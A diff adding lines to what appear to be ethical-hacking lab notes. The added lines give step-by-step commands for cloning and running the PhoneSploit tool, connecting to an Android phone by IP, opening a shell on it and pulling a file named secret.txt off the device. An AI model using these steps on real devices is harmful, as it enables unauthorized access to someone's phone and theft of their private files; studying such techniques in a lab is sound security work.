@@ -103,6 +103,39 @@ In the browser type http://10.10.10.11/share
 
 
 
+----------------------------------------------------------------------------------------------------
+#to access tools on windows from linux
+
+smb://10.10.10.10
+
+
+# Same thing can be done via PhoneSploit tool 
+git clone https://github.com/aerosol-can/PhoneSploit
+cd PhoneSploit
+pip3 install colorama
+OR
+python3 -m pip install colorama
+
+python3 phonesploit.py
+
+# Type 3 and Press Enter to Connect a new Phone OR Enter IP of Android Device
+# Type 4, to Access Shell on phone
+
+pwd
+ls
+cd sdcard
+ls
+cd Download
+
+#Download File using PhoneSploit
+9. Pull Folders from Phone to PC
+
+Enter the Full Path of file to Download
+sdcard/Download/secret.txt
+
+
+
+
 
 
 
